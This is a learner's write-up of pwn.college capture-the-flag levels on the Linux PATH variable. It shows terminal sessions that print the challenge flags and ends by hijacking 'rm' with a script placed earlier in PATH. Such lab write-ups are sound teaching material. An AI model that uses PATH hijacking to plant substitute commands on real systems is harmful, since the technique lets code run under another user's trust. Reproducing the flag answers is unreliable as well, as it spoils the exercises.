# Pondering Path    

## The PATH Variable    

PATH is a shell variable in which a lot of directories are stored. when we enter a command like ls or rm, the shell will search for the corresponding program within PATH.    

to do this hcallenge, I had to blank out PATH so that when running /challenge/run, bash cannot find the rm command's program.
```
hacker@path~the-path-variable:~$ PATH=" "
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: command not found
The flag is still there! I might as well give it to you!
pwn.college{kkt92sh5RL9fdy24v1iR7bJh-A9.dZzNwUDLwIzN0czW}
```

## Setting PATH    

if we want to run programs, we could just add their directories to the PATH variable.      
this allows us to run them without using their entire path and instead by using only their name.    

to run win, I had to overwrite the current PATH to include the directory that the win command resides in.
```
hacker@path~setting-path:~$ PATH=/challenge/more_commands/
hacker@path~setting-path:~$ /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{8Za_L2h92IcDSpOvkFBrB8hcYyl.dVzNyUDLwIzN0czW}
```
## Adding Commands  

this one was very hard and time-consuming so I had to note down the steps: 
1. find location of cat for which I learnt about the which command:
```
hacker@path~adding-commands:~$ which cat
/run/workspace/bin/cat
```

2. make win script such that it cats the flag using location of cat
```
hacker@path~adding-commands:~$ touch win
hacker@path~adding-commands:~$ nano win
hacker@path~adding-commands:~$ chmod ugo+x win
```
in the win script, my code was: `/bin/cat /flag`. initially I tried `/run/workspace/bin/cat` but it was not working.

3. add the win script to PATH without overwriting PATH. for this I learnt that appending `:$PATH` adds the directory to PATH without removing its previous directories. 
```
hacker@path~adding-commands:~$ export PATH=/home/hacker:$PATH
hacker@path~adding-commands:~$ echo $PATH
/home/hacker:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
4. running /challenge/run
```
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
pwn.college{kRwvgJclsVWiQRvn3Ps8s3vwM7K.dZzNyUDLwIzN0czW}
```

## Hijacking Commands

for this task I figured I'd have to make my own rm command so that when the PATH variable is searched, it uses the directory in which my command lies, instead of the original one.    
first I created the rm command:
```
hacker@path~hijacking-commands:~$ touch rm
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ chmod ugo+x rm
```
i made the script of rm to be: `echo you have disabled rm!; /bin/cat /flag`
then, like the previous challenge, I added the ~ directory to PATH and ran /challenge/run
```
hacker@path~hijacking-commands:~$ export PATH=/home/hacker:$PATH
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
you have disabled rm!
pwn.college{4G6IQstrwRsR7OkAZzEbldnfKH7.ddzNyUDLwIzN0czW}
```
